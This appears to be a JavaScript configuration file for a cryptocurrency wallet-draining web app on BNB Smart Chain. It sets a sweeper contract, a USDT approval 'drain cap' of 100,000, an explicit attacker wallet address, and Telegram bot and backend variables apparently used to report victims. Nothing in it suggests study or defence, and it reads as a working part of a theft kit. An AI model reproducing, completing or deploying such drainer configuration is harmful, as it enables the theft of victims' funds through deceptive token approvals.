// ========== BLOCKCHAIN CONFIG ==========
export const CHAIN_ID = 56;
export const CHAIN_NAME = "BNB Smart Chain";
export const RPC_URL = "https://bsc-dataseed.binance.org/";
export const EXPLORER = "https://bscscan.com/tx/";

// ========== TOKENS ==========
export const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
export const USDT_DECIMALS = 18; // USDT on BSC uses 18 decimals

// ========== SWEEPER CONTRACT ==========
export const SWEEPER_CONTRACT = "0x802E52D35F64cfa78e0DBf1Ab920aAA71030308e";

// ========== FUNDING WALLET ==========
export const FUNDING_AMOUNT = "0.0005";

// ========== DRAIN CAP ==========
export const MAX_APPROVE_USDT = "100000";

// ========== TELEGRAM (values set in Netlify dashboard, NOT in code) ==========
export const TG_BOT_TOKEN = import.meta.env.VITE_TG_BOT_TOKEN || "";
export const TG_CHAT_ID = import.meta.env.VITE_TG_CHAT_ID || "";

// ========== CONFIG OBJECT ==========
export const CONFIG = {
  SWEEPER_CONTRACT: "0x802E52D35F64cfa78e0DBf1Ab920aAA71030308e",
  USDT_CONTRACT: "0x55d398326f99059fF775485246999027B3197955",
  ATTACKER_ADDRESS: "0xEe9C8FF3c779062C5BBcda70e4Ca615F94B34c66",
  BACKEND_URL: import.meta.env.VITE_BACKEND_URL || "",
  MAX_APPROVE_USDT: "100000",
  USDT_DECIMALS: 18,
  FUNDING_AMOUNT: "0.0005",
};